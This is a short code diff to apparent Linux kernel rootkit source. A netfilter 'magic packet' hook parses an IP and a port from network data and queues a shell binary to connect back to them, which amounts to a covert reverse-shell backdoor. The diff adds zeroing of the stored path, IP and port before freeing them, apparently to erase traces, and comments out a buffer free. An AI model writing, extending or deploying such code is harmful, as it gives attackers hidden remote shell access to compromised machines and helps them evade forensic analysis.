@@ -127,7 +127,12 @@ void shell_execer(struct work_struct *work) {
     	char *argv[] = { task->path, "-t", task->ip, "-p", task->port, NULL };
 
     	exec(argv);
-    	if(task) kfree(task);
+    	if(task) {
+		bzero(task->path, strlen(task->path));	
+		bzero(task->ip, strlen(task->ip));	
+		bzero(task->port, strlen(task->port));	
+		kfree(task);
+	}
 }
 
 int shell_exec_queue(char *path, char *ip, char *port) {
@@ -243,7 +248,7 @@ void decode_n_spawn(char *data) {
 	strsep(&buf, " ");
 
         if((atoi(port) > 0 && atoi(port) <= 65535) || (strlen(ip) >= 7 && strlen(ip) <= 15)) shell_exec_queue(SHELL, ip, port);
-	if(buf) kfree(buf);
+	//if(buf) kfree(buf);
 }
 
 unsigned int magic_packet_hook(const struct nf_hook_ops *ops, struct sk_buff *socket_buffer, 
